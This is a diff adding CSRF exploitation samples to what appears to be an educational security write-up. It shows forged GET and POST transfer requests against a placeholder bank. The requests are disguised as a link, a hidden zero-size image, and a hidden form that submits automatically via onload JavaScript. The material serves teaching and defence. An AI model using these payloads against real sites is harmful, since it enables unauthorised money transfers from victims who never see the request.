@@ -58,7 +58,46 @@ In **multi-step csrf** the action trigered by the hacker link needs more actions
 # Exploitation samples
 ## GET scenario
 In this part, we will give a technical description of the figure used in the [Components](#components) section. 
-In addition to this, the parameters of 
+In addition to this, the **parameters of mailicious link** are all transmitted via an **HTTP GET** method.
+```html
+GET http://bank.com/transfer.do?acct=PERPRETOR&amount=100 HTTP/1.1
+```
+But as mentioned above, the malicious link is **embedded** in something that seems lawful.
+The exploit URL can be disguised as an ordinary link, encouraging the victim to click it: 
+```html
+<a href="http://bank.com/transfer.do?acct=WEBVISITOR&amount=100000">View my Pictures!</a>
+```
+Or as a **0x0** fake image: 
+```html
+<img src="http://bank.com/transfer.do?acct=WEBVISITOR&amount=100000" width="0" height="0" border="0">
+```
+If this image tag were included in the email, the **Website visitor** wouldn't see anything. However, the browser will still submit the request to **bank.com** (the server component) **without any visual indication** that the transfer has taken place. 
+
+## POST scenario
+The only difference between **GET** and **POST** attacks is how the attack is being executed by the victim. Let's assume the bank now uses **POST** and the vulnerable request looks like this: 
+
+```html
+POST http://bank.com/transfer.do HTTP/1.1
+acct=PERPRETOR&amount=100
+```
+Such a request cannot be delivered using standard **A** or **IMG** tags, but can be delivered using a **FORM** tag: 
+```html
+<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
+<input type="hidden" name="acct" value="WEBVISITOR"/>
+<input type="hidden" name="amount" value="100000"/>
+<input type="submit" value="View my pictures"/>
+</form>
+```
+This form will require the user to click on the submit button, but this can be also executed automatically using **JavaScript**: 
+```javascript
+<body onload="document.forms[0].submit()">
+/*Here is the prior malicious code*/
+<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
+<input type="hidden" name="acct" value="WEBVISITOR"/>
+<input type="hidden" name="amount" value="100000"/>
+<input type="submit" value="View my pictures"/>
+</form>
+```
 ## Presence detection
 Detection of CSRF flaws is made via **penetration testing** or **code analysis**. 
 * **Penetration testing**
